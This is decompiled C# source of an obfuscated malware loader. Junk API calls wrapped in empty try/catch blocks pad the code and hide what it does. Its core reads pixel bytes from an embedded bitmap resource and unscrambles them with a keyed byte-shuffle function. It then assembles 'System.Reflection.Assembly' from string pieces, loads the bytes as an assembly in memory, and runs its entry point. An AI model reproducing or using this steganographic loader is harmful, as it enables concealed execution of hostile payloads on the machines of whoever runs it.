using System;
using System.CodeDom;
using System.Collections;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.IO.Ports;
using System.Net;
using System.Net.Configuration;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.Remoting.Contexts;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization;
using System.Security;
using System.Security.Permissions;
using System.Text;
using System.Xml;

namespace RotasTertiaries;

internal static class RotasTertiaries
{
	private static void PsychicResolvers()
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0410: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			UTF32Encoding uTF32Encoding = null;
			byte[] bytes = null;
			uTF32Encoding.GetChars(bytes);
			AssemblyBuilder assemblyBuilder = null;
			assemblyBuilder.GetReferencedAssemblies();
		}
		catch
		{
		}
		ResourceManager resourceManager = new ResourceManager("SuperlativeReprieved.Properties.Resources", typeof(RotasTertiaries).Assembly);
		try
		{
			LocalFileSettingsProvider val = null;
			SettingsContext val2 = null;
			val.Reset(val2);
			SerializationInfo serializationInfo = null;
			string name = null;
			serializationInfo.GetByte(name);
		}
		catch
		{
		}
		Bitmap val3 = (Bitmap)resourceManager.GetObject("StirStereoscopically");
		try
		{
			string text = null;
			text.Normalize();
			ConfigXmlDocument val4 = null;
			string version = null;
			string encoding = null;
			string standalone = null;
			((XmlDocument)(object)val4).CreateXmlDeclaration(version, encoding, standalone);
		}
		catch
		{
		}
		try
		{
			SocketPermission val5 = null;
			((CodeAccessPermission)val5).PermitOnly();
			GenericTypeParameterBuilder genericTypeParameterBuilder = null;
			string name2 = null;
			Binder binder = null;
			Type[] types = null;
			ParameterModifier[] modifiers = null;
			genericTypeParameterBuilder.GetMethod(name2, BindingFlags.Default, binder, types, modifiers);
		}
		catch
		{
		}
		int num = 828;
		try
		{
			GenericTypeParameterBuilder genericTypeParameterBuilder2 = null;
			Binder binder2 = null;
			Type[] types2 = null;
			ParameterModifier[] modifiers2 = null;
			genericTypeParameterBuilder2.GetConstructor(BindingFlags.Default, binder2, types2, modifiers2);
		}
		catch
		{
		}
		num += 700;
		try
		{
			Module module = null;
			Type[] genericTypeArguments = null;
			Type[] genericMethodArguments = null;
			module.ResolveField(0, genericTypeArguments, genericMethodArguments);
		}
		catch
		{
		}
		int num2 = 0;
		try
		{
			CodeAttributeArgumentCollection val6 = null;
			((CollectionBase)(object)val6).Clear();
			Stack stack = null;
			stack.ToArray();
		}
		catch
		{
		}
		Color[] array = new Color[((Image)val3).get_Height() * ((Image)val3).get_Width()];
		try
		{
			BinaryReader binaryReader = null;
			binaryReader.ReadUInt16();
			UTF8Encoding uTF8Encoding = null;
			byte[] bytes2 = null;
			uTF8Encoding.GetChars(bytes2);
		}
		catch
		{
		}
		for (int i = 0; i < ((Image)val3).get_Height(); i++)
		{
			num += 481;
			for (int j = 0; j < ((Image)val3).get_Width(); j++)
			{
				num += 306;
				ref Color reference = ref array[num2++];
				reference = val3.GetPixel(j, i);
				num += 106;
			}
		}
		try
		{
			Graphics val7 = null;
			Image val8 = null;
			PointF[] array2 = null;
			val7.DrawImage(val8, array2);
			MethodBody methodBody = null;
			methodBody.GetILAsByteArray();
		}
		catch
		{
		}
		byte[] array3 = new byte[num2 * 3];
		try
		{
			SerializationInfo serializationInfo2 = null;
			string name3 = null;
			Type type = null;
			serializationInfo2.GetValue(name3, type);
			string text2 = null;
			text2.ToCharArray();
		}
		catch
		{
		}
		int num3 = 0;
		try
		{
			Type type2 = null;
			type2.MakeByRefType();
			CredentialCache credentialCache = null;
			string host = null;
			string authenticationType = null;
			NetworkCredential credential = null;
			credentialCache.Add(host, 0, authenticationType, credential);
		}
		catch
		{
		}
		for (int k = 0; k < num2; k++)
		{
			num += 438;
			array3[num3++] = array[k].B;
			num += 796;
			array3[num3++] = array[k].G;
			num += 261;
			array3[num3++] = array[k].R;
			num += 363;
		}
		try
		{
			string text3 = null;
			string value = null;
			text3.IndexOf(value, 0);
			Attachment attachment = null;
			attachment.Dispose();
		}
		catch
		{
		}
		SmartenSoundly(array3, 8635, 1136633676u, 0);
		try
		{
			PrintDocument val9 = null;
			val9.Print();
			ConfigXmlDocument val10 = null;
			string elementId = null;
			((XmlDocument)(object)val10).GetElementById(elementId);
		}
		catch
		{
		}
		string text4 = "System.Reflection";
		try
		{
			GenericTypeParameterBuilder genericTypeParameterBuilder3 = null;
			string name4 = null;
			Type[] types3 = null;
			genericTypeParameterBuilder3.GetMethod(name4, types3);
			AuthenticatedStream authenticatedStream = null;
			byte[] buffer = null;
			authenticatedStream.Write(buffer, 0, 0);
		}
		catch
		{
		}
		text4 += ".Assembly";
		try
		{
			SynchronizationAttribute val11 = null;
			Context val12 = null;
			((ContextAttribute)val11).IsNewContextOK(val12);
			ImageAttributes val13 = null;
			val13.ClearBrushRemapTable();
		}
		catch
		{
		}
		Type type3 = Type.GetType(text4);
		try
		{
			ILGenerator iLGenerator = null;
			Type exceptionType = null;
			iLGenerator.BeginCatchBlock(exceptionType);
			UTF32Encoding uTF32Encoding2 = null;
			uTF32Encoding2.GetPreamble();
		}
		catch
		{
		}
		MethodInfo method = type3.GetMethod("Load", new Type[1] { typeof(byte[]) });
		try
		{
			Font val14 = null;
			val14.GetHeight();
		}
		catch
		{
		}
		Assembly assembly = (Assembly)method.Invoke(null, new object[1] { array3 });
		try
		{
			TypeBuilder typeBuilder = null;
			typeBuilder.GetMethods();
			ConstructorBuilder constructorBuilder = null;
			constructorBuilder.GetToken();
			TypeBuilder typeBuilder2 = null;
			string name5 = null;
			Type returnType = null;
			Type[] types4 = null;
			ParameterModifier[] modifiers3 = null;
			typeBuilder2.GetProperty(name5, returnType, types4, modifiers3);
		}
		catch
		{
		}
		assembly.EntryPoint!.Invoke(null, new object[0]);
		try
		{
			SerializationInfo serializationInfo3 = null;
			string name6 = null;
			serializationInfo3.AddValue(name6, value: false);
			UnicodeEncoding unicodeEncoding = null;
			unicodeEncoding.GetPreamble();
			Array array4 = null;
			Array array5 = null;
			array4.CopyTo(array5, 0L);
		}
		catch
		{
		}
	}

	private static void SongsPopularisations()
	{
	}

	private static void SmartenSoundly(byte[] TarsTigerish, int PreternaturalSenates, uint RusticateTenses, int SiberianRelay)
	{
		int num = 267;
		try
		{
			Type type = null;
			type.MakeByRefType();
		}
		catch
		{
		}
		num = 195;
		try
		{
			CredentialCache credentialCache = null;
			string host = null;
			string authenticationType = null;
			NetworkCredential credential = null;
			credentialCache.Add(host, 0, authenticationType, credential);
			string text = null;
			string value = null;
			text.IndexOf(value, 0);
		}
		catch
		{
		}
		for (int num2 = PreternaturalSenates; num2 != 0; num2--)
		{
			int num3 = (int)(RusticateTenses % (uint)PreternaturalSenates);
			num += 81;
			byte b = TarsTigerish[num3];
			num += 937;
			TarsTigerish[num3] = TarsTigerish[num2 - 1];
			num += 54;
			TarsTigerish[num2 - 1] = b;
			num = 339;
			num = 1299;
			num = 1690;
			RusticateTenses = (RusticateTenses >> 25) | (RusticateTenses << 7);
			num = 297;
			num = 694;
			num = 1241;
			RusticateTenses -= (uint)PreternaturalSenates;
			num = 315;
			num = 1099;
			num = 1819;
			RusticateTenses -= 1234012339;
			num = 570;
			num = 1427;
			num = 1591;
			RusticateTenses -= 555551;
		}
	}

	private static void RepressProtege()
	{
	}

	private static void Main()
	{
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Attachment attachment = null;
			attachment.Dispose();
			PrintDocument val = null;
			val.Print();
			ConfigXmlDocument val2 = null;
			string elementId = null;
			((XmlDocument)(object)val2).GetElementById(elementId);
			GenericTypeParameterBuilder genericTypeParameterBuilder = null;
			string name = null;
			Type[] types = null;
			genericTypeParameterBuilder.GetMethod(name, types);
			AuthenticatedStream authenticatedStream = null;
			byte[] buffer = null;
			authenticatedStream.Write(buffer, 0, 0);
			SynchronizationAttribute val3 = null;
			Context val4 = null;
			((ContextAttribute)val3).IsNewContextOK(val4);
			ImageAttributes val5 = null;
			val5.ClearBrushRemapTable();
			ILGenerator iLGenerator = null;
			Type exceptionType = null;
			iLGenerator.BeginCatchBlock(exceptionType);
			UTF32Encoding uTF32Encoding = null;
			uTF32Encoding.GetPreamble();
			Font val6 = null;
			val6.GetHeight();
			TypeBuilder typeBuilder = null;
			typeBuilder.GetMethods();
			ConstructorBuilder constructorBuilder = null;
			constructorBuilder.GetToken();
			TypeBuilder typeBuilder2 = null;
			string name2 = null;
			Type returnType = null;
			Type[] types2 = null;
			ParameterModifier[] modifiers = null;
			typeBuilder2.GetProperty(name2, returnType, types2, modifiers);
			SerializationInfo serializationInfo = null;
			string name3 = null;
			serializationInfo.AddValue(name3, value: false);
		}
		catch
		{
		}
		PsychicResolvers();
		try
		{
			UnicodeEncoding unicodeEncoding = null;
			unicodeEncoding.GetPreamble();
			Array array = null;
			Array array2 = null;
			array.CopyTo(array2, 0L);
			UTF32Encoding uTF32Encoding2 = null;
			byte[] bytes = null;
			uTF32Encoding2.GetChars(bytes);
			AssemblyBuilder assemblyBuilder = null;
			assemblyBuilder.GetReferencedAssemblies();
			LocalFileSettingsProvider val7 = null;
			SettingsContext val8 = null;
			val7.Reset(val8);
			SerializationInfo serializationInfo2 = null;
			string name4 = null;
			serializationInfo2.GetByte(name4);
			string text = null;
			text.Normalize();
			ConfigXmlDocument val9 = null;
			string version = null;
			string encoding = null;
			string standalone = null;
			((XmlDocument)(object)val9).CreateXmlDeclaration(version, encoding, standalone);
			PropertyBuilder propertyBuilder = null;
			propertyBuilder.GetOptionalCustomModifiers();
			ImageAttributes val10 = null;
			val10.ClearNoOp((ColorAdjustType)0);
			EventLogTraceListener val11 = null;
			string message = null;
			string category = null;
			((TraceListener)(object)val11).Write(message, category);
			SerialPort val12 = null;
			((Component)(object)val12).Dispose();
			SocketPermissionAttribute val13 = null;
			((SecurityAttribute)(object)val13).CreatePermission();
			ImageAttributes val14 = null;
			float num = 0f;
			val14.SetThreshold(num, (ColorAdjustType)0);
			Process process = null;
			process.Close();
			MethodCall val15 = null;
			val15.ResolveMethod();
			TypeBuilder typeBuilder3 = null;
			typeBuilder3.GetDefaultMembers();
			MethodCallMessageWrapper val16 = null;
			val16.GetInArg(0);
			NetworkInformationPermission val17 = null;
			((CodeAccessPermission)val17).Assert();
			MailSettingsSectionGroup val18 = null;
			((ConfigurationSectionGroup)val18).ForceDeclaration(false);
			Type type = null;
			string name5 = null;
			Binder binder = null;
			Type returnType2 = null;
			Type[] types3 = null;
			ParameterModifier[] modifiers2 = null;
			type.GetProperty(name5, BindingFlags.Default, binder, returnType2, types3, modifiers2);
			UTF8Encoding uTF8Encoding = null;
			byte[] bytes2 = null;
			char[] chars = null;
			uTF8Encoding.GetChars(bytes2, 0, 0, chars, 0);
			SocketPermission val19 = null;
			((CodeAccessPermission)val19).PermitOnly();
			GenericTypeParameterBuilder genericTypeParameterBuilder2 = null;
			string name6 = null;
			Binder binder2 = null;
			Type[] types4 = null;
			ParameterModifier[] modifiers3 = null;
			genericTypeParameterBuilder2.GetMethod(name6, BindingFlags.Default, binder2, types4, modifiers3);
			GenericTypeParameterBuilder genericTypeParameterBuilder3 = null;
			Binder binder3 = null;
			Type[] types5 = null;
			ParameterModifier[] modifiers4 = null;
			genericTypeParameterBuilder3.GetConstructor(BindingFlags.Default, binder3, types5, modifiers4);
			Module module = null;
			Type[] genericTypeArguments = null;
			Type[] genericMethodArguments = null;
			module.ResolveField(0, genericTypeArguments, genericMethodArguments);
			CodeAttributeArgumentCollection val20 = null;
			((CollectionBase)(object)val20).Clear();
			Stack stack = null;
			stack.ToArray();
			BinaryReader binaryReader = null;
			binaryReader.ReadUInt16();
			UTF8Encoding uTF8Encoding2 = null;
			byte[] bytes3 = null;
			uTF8Encoding2.GetChars(bytes3);
			Graphics val21 = null;
			Image val22 = null;
			PointF[] array3 = null;
			val21.DrawImage(val22, array3);
			MethodBody methodBody = null;
			methodBody.GetILAsByteArray();
			SerializationInfo serializationInfo3 = null;
			string name7 = null;
			Type type2 = null;
			serializationInfo3.GetValue(name7, type2);
			string text2 = null;
			text2.ToCharArray();
			Type type3 = null;
			type3.MakeByRefType();
			CredentialCache credentialCache = null;
			string host = null;
			string authenticationType = null;
			NetworkCredential credential = null;
			credentialCache.Add(host, 0, authenticationType, credential);
			string text3 = null;
			string value = null;
			text3.IndexOf(value, 0);
			Attachment attachment2 = null;
			attachment2.Dispose();
			PrintDocument val23 = null;
			val23.Print();
			ConfigXmlDocument val24 = null;
			string elementId2 = null;
			((XmlDocument)(object)val24).GetElementById(elementId2);
			GenericTypeParameterBuilder genericTypeParameterBuilder4 = null;
			string name8 = null;
			Type[] types6 = null;
			genericTypeParameterBuilder4.GetMethod(name8, types6);
			AuthenticatedStream authenticatedStream2 = null;
			byte[] buffer2 = null;
			authenticatedStream2.Write(buffer2, 0, 0);
			SynchronizationAttribute val25 = null;
			Context val26 = null;
			((ContextAttribute)val25).IsNewContextOK(val26);
			ImageAttributes val27 = null;
			val27.ClearBrushRemapTable();
			ILGenerator iLGenerator2 = null;
			Type exceptionType2 = null;
			iLGenerator2.BeginCatchBlock(exceptionType2);
			UTF32Encoding uTF32Encoding3 = null;
			uTF32Encoding3.GetPreamble();
			Font val28 = null;
			val28.GetHeight();
			TypeBuilder typeBuilder4 = null;
			typeBuilder4.GetMethods();
			ConstructorBuilder constructorBuilder2 = null;
			constructorBuilder2.GetToken();
			TypeBuilder typeBuilder5 = null;
			string name9 = null;
			Type returnType3 = null;
			Type[] types7 = null;
			ParameterModifier[] modifiers5 = null;
			typeBuilder5.GetProperty(name9, returnType3, types7, modifiers5);
			SerializationInfo serializationInfo4 = null;
			string name10 = null;
			serializationInfo4.AddValue(name10, value: false);
			UnicodeEncoding unicodeEncoding2 = null;
			unicodeEncoding2.GetPreamble();
			Array array4 = null;
			Array array5 = null;
			array4.CopyTo(array5, 0L);
			UTF32Encoding uTF32Encoding4 = null;
			byte[] bytes4 = null;
			uTF32Encoding4.GetChars(bytes4);
			AssemblyBuilder assemblyBuilder2 = null;
			assemblyBuilder2.GetReferencedAssemblies();
			LocalFileSettingsProvider val29 = null;
			SettingsContext val30 = null;
			val29.Reset(val30);
			SerializationInfo serializationInfo5 = null;
			string name11 = null;
			serializationInfo5.GetByte(name11);
			string text4 = null;
			text4.Normalize();
			ConfigXmlDocument val31 = null;
			string version2 = null;
			string encoding2 = null;
			string standalone2 = null;
			((XmlDocument)(object)val31).CreateXmlDeclaration(version2, encoding2, standalone2);
		}
		catch
		{
		}
	}

	private static void PlugSmokestack()
	{
	}
}
